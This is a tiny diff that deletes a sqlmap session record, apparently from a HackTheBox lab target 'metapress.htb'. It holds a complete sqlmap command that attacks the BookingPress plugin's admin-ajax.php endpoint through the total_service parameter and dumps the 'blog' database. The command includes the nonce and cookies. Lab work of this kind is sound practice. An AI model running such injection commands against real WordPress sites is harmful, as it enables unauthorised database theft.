@@ -1,3 +1,0 @@
-http://metapress.htb/wp-admin/admin-ajax.php (POST)  # /usr/bin/sqlmap --url http://metapress.htb/wp-admin/admin-ajax.php --data=action=bookingpress_front_get_category_services&_wpnonce=65ad7bec42&category_id=1&total_service=1 "--cookie=PHPSESSID=bbh3nao433sisnl9a9lo9am3qm; wordpress_test_cookie=WP%20Cookie%20check" --random-agent -p total_service --dbms=MySQL --dump -D blog --level=5 --risk=3
-
-action=bookingpress_front_get_category_services&_wpnonce=65ad7bec42&category_id=1&total_service=1
